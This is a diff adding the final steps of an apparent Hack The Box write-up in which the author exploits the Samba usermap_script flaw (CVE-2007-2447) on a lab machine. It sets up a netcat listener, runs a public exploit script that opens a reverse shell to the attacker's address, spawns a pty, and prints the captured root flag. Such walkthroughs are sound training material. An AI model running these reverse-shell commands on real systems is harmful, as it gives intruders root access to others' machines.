@@ -94,8 +94,84 @@ cat /usr/share/exploitdb/exploits/unix/remote/16320.rb | grep CVE
 ![image](https://user-images.githubusercontent.com/70703371/210201888-d40c6da4-5683-446c-bdab-5fb2e9b36b70.png)
 
 
+13. Let's jump to the url given.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210202094-58193400-1969-4846-ba75-b43b2eaf6987.png)
 
 
+![image](https://user-images.githubusercontent.com/70703371/210202106-36e7a9a7-e101-4d3e-8306-c9ea0ec6c3a1.png)
+
+
+14. Based on the samba documentation, we know that there's a configuration option which is not enabled by default and it can lead to RCE.
+15. Anyway when searched the CVE number at google, i found this github repository.
+
+```
+https://github.com/amriunix/CVE-2007-2447
+```
+
+16. Before run the script, run `nc -nlvp 4444` so we can grab the reverse shell spawned by listening.
+17. Next run this payload:
+
+```
+python3 usermap_script.py 10.10.10.3 139 10.10.14.4 4444
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210202810-dc68003d-953e-4ade-ad7c-8a4d57f403de.png)
+
+![image](https://user-images.githubusercontent.com/70703371/210202839-b54d45dc-40ab-4f66-8bbe-0d0abc4bd771.png)
+
+
+18. Let's type `id` and `whoami`.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210202885-0ff156e9-eb89-4857-8a95-375a6e938860.png)
+
+
+19. We are `root`, that's great! We don't need privilege escalation then to solve this challenge.
+20. The next thing to do now is to stabilize our shell first.
+21. Let's run this python command:
+
+```py
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210203099-50b7ad5d-dd42-46f0-9ee5-0f330c2b35e1.png)
+
+22. Now let's list all files or directories inside the machine.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210203135-4c5a55f4-24f9-4c9a-81af-d1f8d599c867.png)
+
+
+23. Jump to the `root` directory. 
+
+> INSIDE
+
+![image](https://user-images.githubusercontent.com/70703371/210203191-594dfec1-aa54-4783-8411-fb170e3235df.png)
+
+
+24. Cat the root.txt file.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210203213-d3ee001a-3cc3-4de6-ba2e-151a4670eef3.png)
+
+
+25. Got the flag!
+
+## FLAG
+
+```
+46b24a994e2c264192df7f7c060f1fdd
+```
 
 
 
